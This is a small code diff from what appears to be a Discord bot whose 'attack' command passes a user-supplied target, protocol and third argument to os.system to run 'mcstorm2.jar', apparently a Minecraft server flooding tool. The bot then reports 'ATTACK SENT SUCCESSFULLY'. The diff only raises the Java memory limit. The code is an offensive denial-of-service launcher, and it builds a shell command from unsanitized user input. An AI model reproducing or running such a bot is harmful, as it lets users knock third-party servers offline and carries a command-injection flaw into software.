@@ -197,7 +197,7 @@ async def posss(ctx, arg1):
 async def attack(ctx, arg1, arg2, arg3):
     def attack():
             os.system(
-                f"java -Xmx14384M -jar mcstorm2.jar {arg1} {arg2} {arg3} 120 -1")
+                f"java -Xmx16384M -jar mcstorm2.jar {arg1} {arg2} {arg3} 120 -1")
             os.system(f"")
     embed = discord.Embed(title=f'>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
     embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
